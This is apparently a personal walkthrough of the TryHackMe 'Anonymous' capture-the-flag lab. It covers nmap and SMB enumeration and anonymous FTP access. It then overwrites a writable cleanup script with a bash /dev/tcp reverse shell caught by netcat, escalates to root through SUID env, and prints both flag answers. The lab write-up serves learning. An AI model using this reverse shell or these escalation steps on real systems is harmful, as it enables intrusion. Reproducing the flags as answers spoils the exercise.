<p align="center">November 11, 2024</p>
<p align="center">Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{189}}$$-day-streak in  <a href="https://tryhackme.com/r/hacktivities">TryHackMe</a>.</p>

<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{ Anonymous }}$$ </h1>
<p align="center">Not the hacking group</p>
<p align="center">Access this free TryHackMe CTF Room clicking <a href="https://tryhackme.com/r/room/anonymous">Anonymous</a>.</p>
<p align="center">
  <img height="90px" hspace="20" src="https://github.com/user-attachments/assets/6b425b38-1b82-4406-93da-c6988046c0b3"><br>
  <img width="900px" src="https://github.com/user-attachments/assets/43d79f41-acec-4a69-a940-55ca14fd5b4a">
</p>

<br>
<br>
<br>
<h2>Task 1. Pwn</h2>

<p align="center"> <img width="800px" src="https://github.com/user-attachments/assets/62596890-c2b8-41c6-af3d-892e6872998a"></p>

<p>Try to get the two flags!  Root the machine and prove your understanding of the fundamentals! This is a virtual machine meant for beginners. Acquiring both flags will require some basic knowledge of Linux and privilege escalation methods.
--------------------------------------------------------------------
For more information on Linux, check out Learn Linux
</p>


<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

<br>

> 1.1. <em>Enumerate the machine.  How many ports are open?</em><br><a id='1.1'></a>
>> <code><strong>4</strong></code>

<br>

> 1.2. <em>What service is running on port 21?</em><br><a id='1.2'></a>
>> <code><strong>ftp</strong></code>

<br>

> 1.3. <em>What service is running on ports 139 and 445?</em><br><a id='1.3'></a>
>> <code><strong>smb</strong></code>

<br>

<pre><code>root@ip-[Attack_Box]:~/anonymous# nmap -sC -vv -A [Target]

Starting Nmap 7.60 ( https://nmap.org ) at 2024-11-11 03:23 GMT
NSE: Loaded 146 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 03:23
Completed NSE at 03:23, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 03:23
Completed NSE at 03:23, 0.00s elapsed
Initiating ARP Ping Scan at 03:23
Scanning 10.10.150.106 [1 port]
Completed ARP Ping Scan at 03:23, 0.23s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 03:23
Completed Parallel DNS resolution of 1 host. at 03:23, 0.00s elapsed
Initiating SYN Stealth Scan at 03:23
Scanning ip-10-10-150-106.eu-west-1.compute.internal (10.10.150.106) [1000 ports]
Discovered open port 139/tcp on [Target]
Discovered open port 445/tcp on [Target]
Discovered open port 22/tcp on [Target]
Discovered open port 21/tcp on [Target]6
Completed SYN Stealth Scan at 03:23, 1.28s elapsed (1000 total ports)
Initiating Service scan at 03:23
Scanning 4 services on ip-10-10-150-106.eu-west-1.compute.internal ([Target])
Completed Service scan at 03:23, 11.02s elapsed (4 services on 1 host)
Initiating OS detection (try #1) against ip-10-10-150-106.eu-west-1.compute.internal ([Target])
adjust_timeouts2: packet supposedly had rtt of -175021 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -175021 microseconds.  Ignoring time.
Retrying OS detection (try #2) against ip-10-10-150-106.eu-west-1.compute.internal ([Target])
Retrying OS detection (try #3) against ip-10-10-150-106.eu-west-1.compute.internal ([Target])
adjust_timeouts2: packet supposedly had rtt of -175189 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -175189 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -174967 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -174967 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -175436 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -175436 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -175163 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -175163 microseconds.  Ignoring time.
Retrying OS detection (try #4) against ip-10-10-150-106.eu-west-1.compute.internal ([Target])
Retrying OS detection (try #5) against ip-10-10-150-106.eu-west-1.compute.internal ([Target])
NSE: Script scanning [Target].
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 03:24
NSE: [ftp-bounce [Target]:21] PORT response: 500 Illegal PORT command.
Completed NSE at 03:24, 0.55s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 03:24
Completed NSE at 03:24, 0.00s elapsed
Nmap scan report for ip-10-10-150-106.eu-west-1.compute.internal ([Target])
Host is up, received arp-response (0.00054s latency).
Scanned at 2024-11-11 03:23:44 GMT for 28s
Not shown: 996 closed ports
Reason: 996 resets
PORT    STATE SERVICE     REASON         VERSION
21/tcp  open  ftp         syn-ack ttl 64 vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:[Attack_Box]5
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 5
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
... 
|   256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (EdDSA)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDHIuFL9AdcmaAIY7u+aJil1covB44FA632BSQ7sUqap
139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
MAC Address: 02:3E:C2:17:0E:5B (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
...
Uptime guess: 18.856 days (since Wed Oct 23 07:51:06 2024)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   ANONYMOUS<00>        Flags: <unique><active>
|   ANONYMOUS<03>        Flags: <unique><active>
|   ANONYMOUS<20>        Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 50957/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 36357/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 44313/udp): CLEAN (Failed to receive data)
|   Check 4 (port 10889/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2024-11-11T03:24:11+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-11-11 03:24:11
|_  start_date: 1600-12-31 23:58:45

TRACEROUTE
HOP RTT     ADDRESS
1   0.54 ms ip-10-10-150-106.eu-west-1.compute.internal (10.10.150.106)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 03:24
Completed NSE at 03:24, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 03:24
Completed NSE at 03:24, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.24 seconds
           Raw packets sent: 1180 (61.662KB) | Rcvd: 1138 (54.786KB)
</code></pre>

<br>
           
> 1.4. <em>There's a share on the user's computer.  What's it called?</em><br><a id='1.4'></a>
>> <code><strong>Pics</strong></code>

<br>
           
<pre><code>root@ip-[Attack_Box]:~/anonymous# smbclient -L 10.10.150.106
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\root's password: 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	pics            Disk      My SMB Share Directory for Pics
	IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            ANONYMOUS
</code></pre>

<br>
           
> 1.5. <em>user.txt</em><br><a id='1.5'></a>
>> <code><strong>90d6f992585815ff991e68748c414740</strong></code>

<br>

<pre><code>root@ip-[Attack_Box]:~/anonymous# ftp 10.10.150.106
Connected to 10.10.150.106.
220 NamelessOne's FTP Server!
Name (10.10.150.106:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
226 Directory send OK.
ftp> cd scripts
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         1634 Nov 11 03:39 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
ftp> get to_do.txt
local: to_do.txt remote: to_do.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for to_do.txt (68 bytes).
226 Transfer complete.
68 bytes received in 0.05 secs (1.2484 kB/s)
ftp> get removed_files.log
local: removed_files.log remote: removed_files.log
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for removed_files.log (1677 bytes).
226 Transfer complete.
1677 bytes received in 0.00 secs (25.7954 MB/s)
ftp> get clean.sh
local: clean.sh remote: clean.sh
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for clean.sh (314 bytes).
226 Transfer complete.
314 bytes received in 0.00 secs (5.2536 MB/s)
ftp> exit
221 Goodbye.
</code></pre>

<br>

<pre><code>root@ip-[Attack_Box]:~/anonymous# ls
clean.sh  removed_files.log  to_do.txt
</code></pre>

<br>

<pre><code>root@ip-[Attack_Box]:~/anonymous# cat to_do.txt
I really need to disable the anonymous login...it's really not safe
</code></pre>

<br>

<pre><code>root@ip-[Attack_Box]:~/anonymous# cat removed_files.log
unning cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
...
Running cleanup script:  nothing to delete
</code></pre>

<br>

<pre><code>root@ip-[Attack_Box]:~/anonymous# at clean.sh
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
</code></pre>

<br>

<p>Let´s used the following payload replacing <code>clean.sh</code></p>

![image](https://github.com/user-attachments/assets/2da1926c-1ba3-4fc4-9239-5ff2e97df430)

<pre><code>
#!/bin/bash
bash -i >& /dev/tcp/[Attack_Box]/[Chosen_Port] 0>&1
</code></pre>

<br>

<pre><code>root@[Attack_Box]:~/anonymous# nc -nvlp [Chosen_Port]
Listening on [0.0.0.0] (family 0, port [Chosen_Port])
</code></pre>

<br>

<pre><code>oot@ip-[Attack_Box]:~/anonymous# ftp [Target]
Connected to [Target].
220 NamelessOne's FTP Server!
Name ([Target]:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
226 Directory send OK.
ftp> cd scripts
250 Directory successfully changed.
ftp> put clean.sh
local: clean.sh remote: clean.sh
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
55 bytes sent in 0.00 secs (1.3113 MB/s)
ftp> 
</code></pre>

<br>

<pre><code>oot@ip-[Attack_Box]:~/anonymous# nc -nvlp [Chosen_Port]
Listening on [0.0.0.0] (family 0, port 4444)
Connection from [Target] 34812 received!
bash: cannot set terminal process group (1522): Inappropriate ioctl for device
bash: no job control in this shell
namelessone@anonymous:~$ ls
ls
pics
user.txt
namelessone@anonymous:~$ cat user.txt
cat user.txt
90d6f992585815ff991e68748c414740
namelessone@anonymous:~$ 
</code></pre>

<br>

> 1.6. <em>root.txt</em><br><a id='1.6'></a>
>> <code><strong>4d930091c31a622a7ed10f27999af363</strong></code>

<br>

<pre><code>namelessone@anonymous:~$ sudo -l
udo -l
sudo: no tty present and no askpass program specified
namelessone@anonymous:~$ find / -user root -perm -u=s 2>/dev/null
find / -user root -perm -u=s 2>/dev/null
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
...
/usr/bin/passwd
/usr/bin/env
...
namelessone@anonymous:~$ env /bin/sh -p
env /bin/sh -p
whoami
root
ls 
pics
user.txt
cd root
/bin/sh: 3: cd: can't cd to root
cat /root/root.txt
4d930091c31a622a7ed10f27999af363
</code></pre>

  


![image](https://github.com/user-attachments/assets/adbf4d86-4cf4-46f1-8b72-a07a8aaa72d9)


![image](https://github.com/user-attachments/assets/cd6b7bcc-1bbe-4576-a12d-3591bd10d6ac)


